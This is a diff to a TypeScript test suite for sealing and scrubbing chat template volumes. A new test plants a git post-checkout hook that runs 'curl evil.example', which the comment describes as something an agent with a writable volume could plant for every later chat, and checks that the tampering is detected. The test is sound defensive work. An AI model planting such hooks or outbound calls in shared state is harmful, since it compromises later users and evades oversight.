@@ -437,9 +437,15 @@ describe("guest chat state", () => {
     await adoptChatTemplate(localPort, templateIdentity(w));
     const filler = await w.prepareInput("filler-chat", w.head());
     await prepareRemoteHost(localPort, filler);
-    await sealChatTemplate(localPort, { ...templateIdentity(w), files: filler.files });
+    const digest = await sealChatTemplate(localPort, {
+      ...templateIdentity(w),
+      files: filler.files,
+    });
     const marker = await NodeFSP.readFile(NodePath.join(w.mount, "template.json"), "utf8");
-    await sealChatTemplate(localPort, { ...templateIdentity(w), files: filler.files });
+    expect(
+      await sealChatTemplate(localPort, { ...templateIdentity(w), files: filler.files }),
+      "a rerun reports the same sealed template",
+    ).toBe(digest);
     expect(
       await NodeFSP.readFile(NodePath.join(w.mount, "template.json"), "utf8"),
       "a second seal is a no-op",
@@ -473,13 +479,16 @@ describe("guest chat state", () => {
     await NodeFSP.writeFile(NodePath.join(modules, "go.mod"), "module example.com\n");
     await NodeFSP.chmod(modules, 0o555);
     await NodeFSP.chmod(NodePath.dirname(modules), 0o555);
-    await scrubChatRoot(localPort, { mount: w.mount, root: w.root });
-    await scrubChatRoot(localPort, { mount: w.mount, root: w.root });
-    expect((await NodeFSP.readdir(w.mount)).sort()).toEqual([
-      "cache.lock",
-      "template",
-      "template.json",
-    ]);
+    await NodeFSP.writeFile(
+      NodePath.join(w.mount, "stash.txt"),
+      "a chat's data left on the volume\n",
+    );
+    await scrubChatRoot(localPort, { mount: w.mount, root: w.root, templateDigest: digest });
+    await scrubChatRoot(localPort, { mount: w.mount, root: w.root, templateDigest: digest });
+    expect(
+      (await NodeFSP.readdir(w.mount)).sort(),
+      "only the sealed template is committed",
+    ).toEqual(["cache.lock", "template", "template.json"]);
     await expect(
       saveChat(localPort, {
         root: w.root,
@@ -511,6 +520,27 @@ describe("guest chat state", () => {
     expect(await NodeFSP.readdir(w.root), "the poisoned chat root is never handed out").toEqual([
       "adopt.json",
     ]);
+  });
+
+  it("refuses to commit a template its chat changed after it was sealed", async () => {
+    const w = await world();
+    await w.newMac("empty");
+    await adoptChatTemplate(localPort, templateIdentity(w));
+    const filler = await w.prepareInput("filler-chat", w.head());
+    await prepareRemoteHost(localPort, filler);
+    const digest = await sealChatTemplate(localPort, {
+      ...templateIdentity(w),
+      files: filler.files,
+    });
+    // What an agent with the volume writable could plant for every later chat.
+    await NodeFSP.writeFile(
+      NodePath.join(w.mount, "template", "workspace.partial", ".git", "hooks", "post-checkout"),
+      "#!/bin/sh\ncurl evil.example\n",
+      { mode: 0o755 },
+    );
+    await expect(
+      scrubChatRoot(localPort, { mount: w.mount, root: w.root, templateDigest: digest }),
+    ).rejects.toThrow("The template changed after it was sealed");
   });
 
   it("adopts a stale template but drops a runtime the new chat does not run", async () => {
